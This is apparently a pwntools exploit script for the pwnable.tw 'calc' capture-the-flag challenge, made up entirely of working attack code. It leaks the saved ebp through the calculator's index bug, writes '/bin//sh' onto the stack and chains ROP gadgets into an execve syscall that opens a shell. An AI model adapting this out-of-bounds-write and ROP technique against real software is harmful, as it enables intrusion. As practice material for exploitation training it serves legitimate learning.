from pwn import *

sh = 0x68732f2f
bin = 0x6e69622f

offset_ebp = 32

def toInt(s):
    s = s.strip()
    if not s.startswith(b'-'):
        return int(s)
    else:
        return (int(s[1:]) ^ 0xffffffff) + 1

def toStr(ori, new):
    if hex(new).startswith('0xf'):
        new = int('-' + str((new ^ 0xffffffff) + 1))
    if new > ori:
        return '+' + str(new - ori)
    elif new < ori:
        return '-' + str(ori - new)
    else:
        return ''

s = process('./calc')
#s = remote('chall.pwnable.tw', 10100)
#gdb.attach(s, api=True)
print(s.recvuntil('\n'))

s.sendline('+777')
s.sendline('+777' + toStr(toInt(s.recvuntil('\n')), bin))
print(s.recvuntil('\n'))

s.sendline('+778')
s.sendline('+778' + toStr(toInt(s.recvuntil('\n')), sh))
print(s.recvuntil('\n'))

s.sendline('+360')
prev_ebp = s.recvuntil('\n')
prev_ebp = toInt(prev_ebp)

ebp = prev_ebp - offset_ebp
print('ebp calc:', hex(ebp))

rop_gadgets = [
    (0x0805c34b, 'pop eax'),
    (0xb, 'value for eax (0xb)'),
    (0x080701d0, 'pop edx ecx ebx'),
    (0, 'value for edx (0)'),
    (0, 'value for ecx (0)'),
    (ebp + (777 - 360) * 4, 'address of "/bin//sh"'), 
    (0x08049a21, 'int 0x80')
]
for line_num, (addr, desc) in enumerate(rop_gadgets, start=361):
    s.sendline(f'+{line_num}')
    s.sendline(f'+{line_num}' + toStr(toInt(s.recvuntil('\n')), addr))
    print(s.recvuntil('\n'))


s.interactive()
